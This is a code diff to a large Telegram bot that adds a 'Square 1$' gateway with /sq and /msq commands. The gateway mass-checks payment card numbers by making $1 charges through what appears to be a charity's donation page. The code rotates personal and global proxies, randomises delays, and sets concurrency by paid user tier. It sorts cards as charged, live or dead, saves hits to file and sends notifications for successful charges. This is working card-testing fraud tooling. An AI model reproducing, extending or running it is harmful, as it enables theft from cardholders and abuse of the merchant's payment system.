+        cards = card_formatter.extract_cards(replied_text)
+        if not cards:
+            single = card_formatter.extract_single_card_from_text(replied_text)
+            if single:
+                cards = [single]
+
+    if not cards:
+        await message.reply_text(
+            "📦 <b>Square 1$ — Mass Check</b>\n\n"
+            "Usage:\n"
+            "• <code>/msq &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "• Reply to a .txt file with <code>/msq</code>",
+            parse_mode=ParseMode.HTML)
+        return
+
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Truncated to {max_batch} cards.")
+
+    can_proceed, err = await check_and_deduct_mass_credits(
+        user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(err, parse_mode=ParseMode.HTML)
+        return
+
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
+    await sq_mass_logic(update, context, cards, None)
+
+
+async def sq_mass_logic(update: Update, context: ContextTypes.DEFAULT_TYPE,
+                        cards: list, progress_msg=None):
+    """
+    Square 1$ mass check.
+    - CHARGED + LIVE cards are shown in chat.
+    - DECLINED / ERROR are silently counted (hidden).
+    - Hit notification fires only for CHARGED cards.
+    """
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+
+    if u_id in sq_active_tasks:
+        await message.reply_text("⚠️ Already running a Square 1$ session. Use /stop.")
+        return
+
+    print(f"\n{'='*80}\n🚀 [SQUARE MASS] user={u_id} cards={total}\n{'='*80}")
+
+    session_id = create_session(u_id, "Square 1$", total)
+    mc_init_session_cards(session_id)
+
+    user_proxies = []
+    if user_manager.can_use_proxy(u_id):
+        if u_id in autosopi_proxy_tracker.working_proxies and \
+           autosopi_proxy_tracker.working_proxies[u_id]:
+            user_proxies = list(autosopi_proxy_tracker.working_proxies[u_id])
+            print(f"🔌 {len(user_proxies)} personal proxies for rotation")
+        # Fall back to the global proxy pool when the user has no personal proxies
+        if not user_proxies and global_proxy_pool.enabled and global_proxy_pool.proxies:
+            user_proxies = list(global_proxy_pool.proxies)
+            print(f"🌐 {len(user_proxies)} global proxies for rotation")
+
+    stats = {
+        "charged": 0,
+        "approved": 0,
+        "declined": 0,
+        "errors": 0,
+        "processed": 0,
+        "total": total,
+    }
+    start_time = time.time()
+    proxy_index = 0
+
+    try:
+        sq_active_tasks[u_id] = True
+        tier = user_manager.get_tier(u_id)
+
+        CONCURRENCY = {"free": 1, "premium": 2, "ultimate": 5, "admin": 8}.get(tier, 2)
+
+        charged_emoji  = premium_emoji(PREMIUM_EMOJI_IDS["charged"],  "🔥")
+        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        dead_emoji     = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        errors_emoji   = premium_emoji(PREMIUM_EMOJI_IDS["error"],    "⚠️")
+
+        if progress_msg is None:
+            initial = (
+                f"<b>Gateway</b> ➛ Square 1$\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
+                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
+                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(
+                initial,
+                parse_mode=ParseMode.HTML,
+                reply_markup=build_mass_check_keyboard(stats, u_id, session_id, "msq"),
+            )
+
+        sem = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed = 0
+
+        async def update_progress(force: bool = False):
+            if not force and processed and processed % 5 != 0 and processed < total:
+                return
+            elapsed = int(time.time() - start_time)
+            mins, secs = elapsed // 60, elapsed % 60
+            tstr = f"{mins}m {secs}s" if mins else f"{secs}s"
+            text = (
+                f"<b>Gateway</b> ➛ Square 1$\n"
+                f"<b>Status</b> ➛ PROCESSING {processed}/{total}\n"
+                f"<b>Checked</b> ➛ {processed}/{total}\n"
+                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
+                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
+                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
+                f"<b>Time</b> ➛ {tstr}"
+            )
+            try:
+                await progress_msg.edit_text(
+                    text,
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=build_mass_check_keyboard(
+                        stats, u_id, session_id, "msq", finished=(processed >= total)),
+                )
+            except Exception:
+                pass
+
+        async def process_one(card, idx):
+            nonlocal processed, proxy_index
+            async with sem:
+                await asyncio.sleep(random.uniform(0.1, 0.3))
+
+                proxy_url = None
+                if user_proxies:
+                    proxy_url = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+                proxy_fmt = format_proxy(proxy_url) if proxy_url else None
+
+                t0 = time.time()
+                res = await sq_check_card(card, proxy_fmt)
+                elapsed = time.time() - t0
+                status_category, response_text = sq_parse_response(res)
+
+                async with stats_lock:
+                    processed += 1
+                    if status_category == "CHARGED":
+                        stats["charged"] += 1
+                        mc_track(session_id, "charged", card)
+                    elif status_category == "LIVE":
+                        stats["approved"] += 1
+                        mc_track(session_id, "live", card)
+                    elif status_category == "DECLINED":
+                        stats["declined"] += 1
+                        mc_track(session_id, "dead", card)
+                    else:
+                        stats["errors"] += 1
+                        mc_track(session_id, "dead", card)
+                    await update_progress()
+
+                if status_category in ("CHARGED", "LIVE"):
+                    bin_info = await get_bin_info(card)
+                    ui = sq_format_result(status_category, response_text,
+                                          card, bin_info, elapsed)
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                    except Exception as e:
+                        print(f"❌ send result: {e}")
+
+                    await save_hit_to_file(
+                        card=card, gateway=SQ_LABEL,
+                        response=response_text, price=SQ_AMOUNT_LABEL,
+                        bin_info=bin_info, user_id=u_id, user_tier=tier)
+
+                    if status_category == "CHARGED":
+                        user_data = user_manager.get_user(u_id)
+                        await send_hit_notification(
+                            context=context, gateway=SQ_LABEL,
+                            card=card, response=response_text, price=SQ_AMOUNT_LABEL,
+                            user=user_data, bin_info=bin_info,
+                            status_category="charged")
+                        user_manager.increment_hits(u_id)
+
+                user_manager.increment_checks(u_id, 1)
+
+        tasks = [asyncio.create_task(process_one(c, i)) for i, c in enumerate(cards)]
+        for coro in asyncio.as_completed(tasks):
+            if u_id not in sq_active_tasks:
+                break
+            try:
+                await coro
+            except Exception as e:
+                print(f"❌ task error: {e}")
+                async with stats_lock:
+                    stats["errors"] += 1
+
+        if u_id in sq_active_tasks:
+            total_t = time.time() - start_time
+            mins, secs = int(total_t // 60), int(total_t % 60)
+            await update_progress(force=True)
+            summary = (
+                f"🟦 <b>Square 1$ Mass Check Complete</b>\n\n"
+                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
+                f"{approved_emoji} <b>Live</b> ➛ {stats['approved']}\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']}\n"
+                f"{errors_emoji} <b>Errors</b> ➛ {stats['errors']}\n"
+                f"📝 <b>Total</b> ➛ {total}\n"
+                f"⏱️ <b>Time</b> ➛ {mins}m {secs}s"
+            )
+            try:
+                await context.bot.send_message(
+                    chat_id=message.chat_id,
+                    text=summary,
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=build_mass_check_keyboard(
+                        stats, u_id, session_id, "msq", finished=True),
+                )
+            except Exception as e:
+                print(f"⚠️ summary send failed: {e}")
+
+        return stats
+
+    except Exception as e:
+        print(f"❌ sq_mass_logic error: {e}\n{traceback.format_exc()}")
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except Exception:
+            pass
+    finally:
+        sq_active_tasks.pop(u_id, None)
+        print(f"🏁 [Square Mass] session ended for user {u_id}")
+
+
 # ============ ADYEN GATEWAY (Picsart) - FIXED ============
 # Add this after your other gateway configurations
 
@@ -75448,6 +76409,10 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         '/st':   'strip5',
         '/mst':  'strip5',
 
+        # Square 1$  (investinginchildren.on.ca)
+        '/sq':   'square_1usd',
+        '/msq':  'square_1usd',
+
         # Stripe SK (CVV charge)
         '/sk':   'stripe_sk',
         '/msk':  'stripe_sk',
@@ -75691,6 +76656,9 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
             context.args = [card]
             asyncio.create_task(strip5_single(update, context))
 
+        elif gateway == 'square_1usd':
+            asyncio.create_task(sq_single_logic(update, context, card))
+
         elif gateway == 'stripe_sk':
             context.args = [card]
             asyncio.create_task(single_check_stripe_sk(update, context))
@@ -75819,6 +76787,7 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         'st1':               'ST1 Auth',
         'ezycourse':         'EzyCourse',
         'stripe_pl':         'Stripe PL',
+        'square_1usd':       'Square 1$',
     }.get(gateway, gateway.replace('_', ' ').title())
 
     progress_text = (
@@ -75842,6 +76811,8 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         asyncio.create_task(sc_mass_check_logic(update, context, cards, progress_msg))
     elif gateway == 'strip5':
         asyncio.create_task(strip5_mass_logic(update, context, cards, progress_msg))
+    elif gateway == 'square_1usd':
+        asyncio.create_task(sq_mass_logic(update, context, cards, progress_msg))
     elif gateway == 'stripe_sk':
         asyncio.create_task(
             _stripe_sk_mass_logic(update, context, cards, _sk_load_secret(), progress_msg)
@@ -76102,6 +77073,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"• <code>/msh</code> - Shopify Mass\n"
                 f"• <code>/mst</code> - STRIP_5$\n"
                 f"• <code>/msk</code> - Stripe SK Charge\n"
+                f"• <code>/msq</code> - Square 1$ Mass\n"
                 f"📌 Or use <code>/cancel</code> to cancel processing."
             )
             
@@ -83138,6 +84110,9 @@ def main():
     
     app.add_handler(CommandHandler("st",  strip5_single,  block=False))
     app.add_handler(CommandHandler("mst", strip5_mass,    block=False))
+
+    app.add_handler(CommandHandler("sq",  sq_single,  block=False))
+    app.add_handler(CommandHandler("msq", sq_mass,    block=False))
     
     app.add_handler(CommandHandler("sk",  single_check_stripe_sk))
     app.add_handler(CommandHandler("msk", mass_check_stripe_sk_command))
@@ -83148,6 +84123,7 @@ def main():
 
     app.add_handler(CallbackQueryHandler(verify_membership_callback, pattern='^verify_membership$'))
     app.add_handler(CallbackQueryHandler(autosopi_get_cards_callback, pattern="^autosopi_get_"))
+    app.add_handler(CallbackQueryHandler(mass_check_stop_callback, pattern="^mcstop_"))
     app.add_handler(CallbackQueryHandler(results_get_callback, pattern="^resget_"))
     app.add_handler(CallbackQueryHandler(reftop_callback, pattern="^ref(top|back)$"))
     app.add_handler(CallbackQueryHandler(settings_callback, pattern="^settings_(menu|hide|unhide)$"))
